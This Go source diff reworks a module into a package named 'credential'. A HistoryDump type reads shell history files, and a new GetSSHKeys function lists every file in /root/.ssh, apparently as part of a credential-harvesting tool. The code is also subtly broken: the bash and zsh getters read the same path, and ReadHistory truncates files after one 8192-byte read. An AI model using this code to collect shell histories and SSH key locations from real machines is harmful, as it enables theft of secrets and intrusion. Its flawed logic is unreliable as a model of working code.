@@ -1,35 +1,53 @@
-package linux
+//go:build linux
+
+package credential
 
 import (
 "os"
 )
 
-type History struct{}
-
-func NewHistory() *History {
-return &History{}
+type HistoryDump struct {
+Path string
 }
 
-func (h *History) ExtractBashHistory(user string) (string, error) {
-path := "/home/" + user + "/.bash_history"
-if user == "root" {
-path = "/root/.bash_history"
+func NewHistoryDump(path string) *HistoryDump {
+return &HistoryDump{Path: path}
 }
-data, err := os.ReadFile(path)
+
+func (h *HistoryDump) ReadHistory() (string, error) {
+file, err := os.Open(h.Path)
 if err != nil {
 return "", err
 }
-return string(data), nil
-}
-
-func (h *History) ExtractZshHistory(user string) (string, error) {
-path := "/home/" + user + "/.zsh_history"
-if user == "root" {
-path = "/root/.zsh_history"
-}
-data, err := os.ReadFile(path)
+defer file.Close()
+buf := make([]byte, 8192)
+n, err := file.Read(buf)
 if err != nil {
 return "", err
 }
-return string(data), nil
+return string(buf[:n]), nil
+}
+
+func (h *HistoryDump) GetBashHistory() (string, error) {
+return h.ReadHistory()
+}
+
+func (h *HistoryDump) GetZshHistory() (string, error) {
+return h.ReadHistory()
+}
+
+func (h *HistoryDump) GetSSHKeys() ([]string, error) {
+dir := "/root/.ssh"
+entries, err := os.ReadDir(dir)
+if err != nil {
+return nil, err
+}
+var keys []string
+for _, entry := range entries {
+if entry.IsDir() {
+continue
+}
+keys = append(keys, dir+"/"+entry.Name())
+}
+return keys, nil
 }
